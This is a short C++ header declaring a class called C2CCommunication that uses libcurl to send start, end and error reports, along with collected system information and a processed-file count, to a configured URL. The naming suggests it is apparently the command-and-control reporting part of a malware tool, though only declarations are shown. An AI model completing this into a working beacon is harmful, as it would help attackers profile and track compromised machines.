#ifndef SYSTEM_INFO_SENDER_H
#define SYSTEM_INFO_SENDER_H

#include <string>
#include <map>
#include <sstream>
#include <curl/curl.h>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/utsname.h>
#endif

class C2CCommunication {
public:
    C2CCommunication(const std::string& url);
    ~C2CCommunication();
    std::map<std::string, std::string> sendStart();
    void sendEnd(std::string uuid, int totalFiles);
    void sendError(std::string uuid, std::string error);

private:
    CURL* curl_;
    std::string url_;

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp);
    std::map<std::string, std::string> getSystemInfo();
    std::string mapToQueryString(const std::map<std::string, std::string>& params);
    std::vector<std::string> split(const std::string& s, char delimiter);
    std::string urlEncode(const std::string &value);
};

#endif